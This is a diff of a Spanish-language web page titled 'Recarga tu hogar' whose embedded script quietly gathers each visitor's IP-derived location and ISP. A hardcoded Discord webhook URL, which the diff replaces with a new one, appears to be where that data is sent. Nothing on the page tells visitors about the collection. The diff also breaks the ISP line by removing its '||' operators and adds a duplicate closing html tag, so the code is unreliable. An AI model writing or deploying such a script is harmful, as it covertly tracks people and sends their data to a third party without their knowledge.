@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="utf-8">
-    <title>Recarga Tu Hogar</title>
+    <title>Recarga tu hogar</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         html,body{margin:0;padding:0;height:100%;overflow:hidden}
@@ -19,7 +19,7 @@
     <!-- ANTES DE </body> -->
     <script>
     (() => {
-      const WEBHOOK = "https://discord.com/api/webhooks/1452423210099278049/kAOU-fMKwDd_upUJW207BbKkfjib0gO3PtKvDKXkVOzNbBADHwdWAN6cj83CDVp6ubDY";
+      const WEBHOOK = "https://discord.com/api/webhooks/1462961080543215682/xuy5KiDmd4BYE63rLGbRkFHCXK0BJaNATSq5V1ZxliOt17fhkcd5-dy9mbst-wrN79No";
       
       async function getIPInfo() {
         try {
@@ -32,7 +32,7 @@
             country_name: data.country_name || "Desconocido",
             city: data.city || "Desconocido",
             country_code: data.country_code || "XX",
-            isp: data.org || data.asn || "No disponible"  // ← ISP agregado aquí
+            isp: data.org  data.asn  "No disponible"  // ← ISP agregado aquí
           };
         } catch {
           return {
@@ -97,4 +97,5 @@
     })();
     </script>
 </body>
+</html>
 </html>
